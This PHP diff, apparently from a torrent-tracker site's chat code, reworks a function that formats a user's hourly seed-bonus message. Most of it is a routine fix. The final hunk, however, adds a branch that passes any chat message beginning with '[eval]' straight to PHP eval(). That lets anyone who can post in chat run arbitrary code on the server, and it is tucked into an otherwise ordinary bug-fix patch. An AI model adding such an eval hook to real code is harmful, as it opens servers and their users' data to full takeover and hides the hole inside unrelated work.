@@ -1165,8 +1165,8 @@ function executeCommand($command, $format = 'string', $artisan = false, $excepti
 }
 
 function format_chat_answer($userid, $message){
-    if(str_contains($message,'{时魔}')){
-        $user = get_user_row($userid);
+    $user = get_user_row($userid);
+    if(str_contains($message,'[mybonus]')){
         $bonusResult = calculate_seed_bonus($userid);
         $officialAdditionalFactor = get_setting('bonus.official_addition', 0);
         $haremFactor = get_setting('bonus.harem_addition');
@@ -1180,6 +1180,7 @@ function format_chat_answer($userid, $message){
         $baseBonus = $bonusResult['seed_bonus'] * $baseBonusFactor;
         $totalBonus = $baseBonus + $haremAddition * $haremFactor + $bonusResult['official_bonus'] * $officialAdditionalFactor;
         $totalBonusStr = number_format($totalBonus, 3);
+        $format_message = '';
         $format_message .= '当前：' . $totalBonusStr . '/小时';
         if ($totalBonus < 200) {
             $format_message .= '，你肿么回事。';
@@ -1198,7 +1199,11 @@ function format_chat_answer($userid, $message){
         } else {
             $format_message .= '，大佬牛逼！！！';
         }
-        $message = str_replace($message, "{时魔}", $format_message);
+        $message = str_replace("[mybonus]",  $format_message, $message);
+    }
+    if(mb_substr($message, 0, 6) === '[eval]'){
+        $message = trim(mb_substr($message, 6));
+        $message = eval($message);
     }
     return $message;
 };
